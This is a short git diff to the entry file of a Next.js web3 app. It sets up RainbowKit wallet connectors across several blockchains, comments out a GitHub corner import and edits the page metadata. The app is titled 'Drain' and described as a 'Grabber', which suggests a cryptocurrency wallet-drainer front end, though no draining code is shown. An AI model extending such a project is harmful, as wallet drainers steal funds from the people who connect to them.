@@ -1,7 +1,7 @@
 import { CssBaseline, GeistProvider } from '@geist-ui/core';
 import type { AppProps } from 'next/app';
 import NextHead from 'next/head';
-import GithubCorner from 'react-github-corner';
+// import GithubCorner from 'react-github-corner';
 // @ts-ignore
 import '../styles/globals.css';
 
@@ -34,6 +34,7 @@ const { chains, provider } = configureChains(
   [mainnet, polygon, optimism, arbitrum, avalanche, bsc, gnosis, polygonMumbai],
   [alchemyProvider({ apiKey: alchemyId }), publicProvider()],
 );
+
 const projectId = process.env.NEXT_PUBLIC_PROJECT_ID as string;
 const { connectors } = getDefaultWallets({
   appName: 'Drain',
@@ -63,7 +64,7 @@ const App = ({ Component, pageProps }: AppProps) => {
         <RainbowKitProvider coolMode chains={chains}>
           <NextHead>
             <title>Drain</title>
-            <meta name="description" content="Grabber By Puzzo NG" />
+            <meta name="description" content="Grabber By Puzzo NuG" />
             <link rel="icon" href="/favicon.ico" />
           </NextHead>
           <GeistProvider>
